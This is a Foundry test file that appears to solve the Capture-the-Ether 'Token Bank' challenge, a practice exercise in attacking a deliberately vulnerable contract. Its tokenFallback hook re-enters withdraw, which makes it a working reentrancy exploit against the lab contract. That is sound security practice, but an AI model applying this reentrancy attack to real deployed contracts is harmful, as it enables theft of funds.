// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";
import "forge-std/console.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here
        uint256 value = 500000 * 10 ** 18;
        tokenBankChallenge.withdraw(value);

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        if (!tokenBankChallenge.isComplete()) tokenBankChallenge.withdraw(value);
    }
}
